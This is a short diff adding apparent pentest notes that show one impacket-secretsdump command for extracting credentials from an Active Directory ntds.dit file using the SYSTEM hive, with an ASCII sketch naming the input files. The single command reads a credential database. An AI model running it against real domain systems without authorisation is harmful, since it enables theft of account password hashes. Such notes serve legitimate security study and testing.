@@ -1,0 +1,5 @@
+to extract the data (creds from ntds.dit file
+
+$ impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
+                               |                 |
+                               *.dit file       data.bin file
